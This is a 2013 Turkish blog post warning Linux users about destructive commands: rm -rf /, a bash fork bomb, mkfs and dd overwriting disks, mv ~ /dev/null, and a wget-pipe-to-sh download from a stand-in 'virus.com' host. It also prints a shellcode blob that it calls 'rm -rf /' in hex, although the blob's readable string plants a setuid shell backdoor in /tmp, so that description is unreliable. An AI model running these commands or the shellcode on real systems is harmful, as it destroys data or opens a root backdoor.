---
layout: post
title: "Ölümcül Linux Komutları"
date: 2013-05-02 16:55
comments: true
categories:
---
Bilindiği üzere linux çok güçlü bir komut kümesine sahip. Tabii ki büyük güç yanında büyük bir sorumlulukta getiriyor.(bknz. Spiderman)  
Ne yaptığınızdan emin değilseniz kullanmamanız gereken komutlar olsun ya da çok kullandığınız bir komutun yanlış kullanımı olsun bunlar
sisteminize büyük zarar verebilir. Komut satırı kullanma aşkıyla internette gördüğünüz her komutu direk kopyala yapıştır yaparsanız
sisteminiz yine göçebilir.  Şimdi biraz bu "ölümcül" komutlardan bahsedelim.  
<!--more-->
## rm -rf /

`rm` komutunu genellikle çok fazla kullanırız. Mahsum bir dosya/dizin silmeye yarayan komut. Ama yukardaki argümanlar `rm`'nin
adeta bir canavara dönüşmesini sağlıyor. Sisteminizde ne var ne yok herşeyi siliyor.( Buna harddiskiniz ve o anda bağlı flashdisklerde dahil )
Komutu incelersek:  
`rm`  => silme işini yapıyor.  
`-rf` => `rm`'nin öz yineli bir şekilde çalışmasını ve hiç bir uyarı vermeden dizinler ve dizinlerin içindeki dizin ve dosyaları silmesini sağlıyor.  
`/`   => silmeye kök diziden başlanacağını belirtiyor.  
Bu komutu yazıp enter'e basarsanız bütün bilgilerinizin silinmesini neden olursunuz.  
**rm -rf ~** bu komut ise benzer şekilde ev dizininizin silinmesine neden olur.  
Sonuç: `rm` komutunu kullanırken dikkatli olmak lazım.

    char esp[] __attribute__ ((section(“.text”))) /* e.s.p
    release */
    = “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68″
    “\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99″
    “\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7″
    “\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56″
    “\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31″
    “\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69″
    “\x6e\x2f\x73\x68\x00\x2d\x63\x00″
    “cp -p /bin/sh /tmp/.beyond; chmod 4755
    /tmp/.beyond;”;

Yukardaki gibi herhangi bir acayip kodu internete bir yerde görüp ne işe yarıyor diye de olsa makinanızda çalıştırmayın.  
Neden mi? Çünkü yukardaki kod **rm -rf /** in HEX halidir. Yine sisteminize elveda diyebilirsiniz.
## :(){ :|: & };:
Yukardaki komuta baktığınızda ilk başta bir çeşit `smiley` kombosu olarak görebilirsiniz. Ama bu bir fonksiyon hemde `bash`
fonksiyonudur. Bu haliyle anlaşılması biraz zor, birde bu haline bakalım:
```  bash
    :() {
        :|:&
    };
    :
```
Şimdi biraz daha açık şekilde gözküyor. `:` fonksiyon ismi(fonksiyon isimleri `bash`te böyle yazılabiliyor). Bu fonksiyon sürekli
kendisinin bir kopyasını üretiyor. Belleğinizi ve CPU'nuzu doldurup makinanızın donmasını ve ya kitlenmesini sağlıyor.  
`fork bomb` denilen bu tür fonksiyonlar her dilde yazılabilir. Tipik DOS(Denial of Service) ataklarıdır.  
Ayrıntılı bilgi için:[Fork Bombaları](http://en.wikipedia.org/wiki/Fork_bomb)

## mkfs.ext4 /dev/sda1
Bu komutumuzda windows işletim sistemindeki  `format c:\` komutu benzeri. Belirtilen (burada `/dev/sda1` olan) harddisk bölümünü formatlıyor.  
`mkfs.ext4` => `ext4` dosya sistemine sahip bir bölüm oluşturur.  
`/dev/sda1`  =>  hedef harddisk bölümü.  

## \[program\] > /dev/sda
Bu komutumuz ise herhangi bir programın çıktısını direk olarak harddisk bölümüne yazar.  
Burada `>` karakteri programın çıktısını `dev/sda` ya göndererek oradaki bilgilerin üzerine yazmasını sağlar.

## dd if=/dev/random of=/dev/sda
Yine yukardaki komuta benzer olarak bu komutta harddiskin verilen bölümüne yazma yapar.  
`dd` => kopyalama işlemini gerçekleştirir.  
`if=/dev/random` => kaynak olarak `/dev/random(rastgele veriler)` al.  
`of=/dev/sda`    => hedef olarak `/dev/sda` al.  

## mv ~ /dev/null
`/dev/null` linux işletim sisteminin tabir-i caizse kara deliğidir. Ne atarsanız yutup yok eder.  
`mv` => taşıma işlemini yapam komut  
`~`  => ev dizini  
`/dev/null` => taşınacak yer  
Yani ev dizinin deki bütün dosyaları alıp götürüp kara deliğe atıyorsunuz.  

## wget http://virus.com/virusludosya -O – | sh
Yukardaki komut ise bir web sitesinden bir program indirip direk çalıştırıyor. Çok tehlikeli bir yaklaşım. Kesinlikle güvenmediğiniz ve ya
ne olduğundan emin olmadığınız dosyalar üzerinde denemeyin.  
`wget` => dosya indirme komutu  
`http://virus.com/virusludosya -O -` => indirilicek dosya  
`| sh`  => çalıştıracak program  

[kaynak](http://www.howtogeek.com/125157/8-deadly-commands-you-should-never-run-on-linux/)
